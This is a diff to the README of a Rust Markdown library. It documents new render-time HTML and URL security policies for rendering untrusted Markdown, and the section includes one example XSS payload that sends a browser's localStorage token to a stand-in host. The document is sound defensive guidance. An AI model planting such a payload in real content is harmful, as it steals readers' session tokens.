@@ -5,7 +5,7 @@
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 [![Rust 1.94.1](https://img.shields.io/badge/rust-1.94.1-orange.svg)](https://www.rust-lang.org)
 
-A Rust Markdown library for applications that need **editor-quality accuracy** — parse, render, and extract intelligence from Markdown.
+A Rust Markdown library for applications that need **editor-quality accuracy** — parse, render, and extract intelligence from Markdown. Safe to point at Markdown you did not write: rendering is governed by [explicit HTML and URL policies](#rendering-markdown-you-did-not-write).
 
 You may be looking for:
 
@@ -51,12 +51,45 @@ Customize rendering (syntax highlighting is on by default, `"github"` theme):
 ```rust
 use marco_core::RenderOptions;
 
-let opts = RenderOptions {
-    syntax_highlighting: true,
-    line_numbers: true,
-    theme: "base16-ocean.dark".to_string(),
-};
+let opts = RenderOptions::new()
+    .with_syntax_highlighting(true)
+    .with_line_numbers(true)
+    .with_theme("base16-ocean.dark");
 ```
+
+### Rendering Markdown you did not write
+
+CommonMark passes raw HTML through to the output. That is correct when the
+author and the reader are the same person, and it is a code-execution channel
+when they are not: `<img src=x onerror="fetch('//evil/'+localStorage.token)">`
+in a comment runs in the browser of whoever reads it.
+
+`RenderOptions` carries two policies for this. Pick a constructor rather than
+assembling flags:
+
+```rust
+use marco_core::{parse, render, RenderOptions};
+
+// A server rendering one user's Markdown to other readers.
+let doc = parse(user_submitted_markdown)?;
+let html = render(&doc, &RenderOptions::untrusted())?;
+
+// A desktop editor rendering the file its own user is editing.
+let html = render(&doc, &RenderOptions::commonmark())?;
+```
+
+| Constructor | Raw HTML | URLs | For |
+|---|---|---|---|
+| `commonmark()` | emitted | any | trusted single-author input; CommonMark conformance |
+| `new()` / `default()` | escaped | dangerous schemes blocked | a desktop editor |
+| `untrusted()` | escaped | safe schemes only | a server rendering one user's Markdown to another |
+
+`untrusted()` may gain further protections in future minor versions without any
+consumer changing a line — prefer it to a hand-assembled combination.
+
+For finer control, `HtmlPolicy` is `Allow` / `Escape` / `Strip` and `UrlPolicy`
+is `Allow` / `BlockDangerous` / `SafeSchemesOnly`, set with `.with_html(…)` and
+`.with_urls(…)`.
 
 Editor intelligence:
 
@@ -95,7 +128,8 @@ let completions = provider.completions(""); // context-aware suggestions
 - CommonMark spec conformance: 357/652 strict, 98.8% structural compliance
 - UTF-8 sanitization (`&[u8]` → `String`) strips null bytes and invalid sequences before parsing
 - GFM task list checkboxes and admonitions render as SVG icons (no CSS-only dependency)
-- 674 tests — 535 unit, 108 integration, 31 doc — all green on the default feature set
+- Render-time security policies for untrusted input — raw HTML and unsafe URL schemes, see [Rendering Markdown you did not write](#rendering-markdown-you-did-not-write)
+- 699 tests — 560 unit, 108 integration, 31 doc — all green on the default feature set
 
 ## When to use marco-core
 
@@ -105,7 +139,12 @@ let completions = provider.completions(""); // context-aware suggestions
 | Editor intelligence (highlights, linting, completions) | **marco-core** |
 | CommonMark + GFM + math + diagrams | **marco-core** |
 | Walk or transform the AST | **marco-core** |
+| Server-side rendering of user-submitted Markdown | **marco-core** with `RenderOptions::untrusted()`, or [`comrak`](https://crates.io/crates/comrak) |
 | Minimal parse → render with no extras | `pulldown-cmark` |
+
+`pulldown-cmark` emits raw HTML and unfiltered URLs by design and leaves
+sanitising to the caller, so it wants an HTML sanitiser such as
+[`ammonia`](https://crates.io/crates/ammonia) in front of a browser.
 
 ## Performance
 
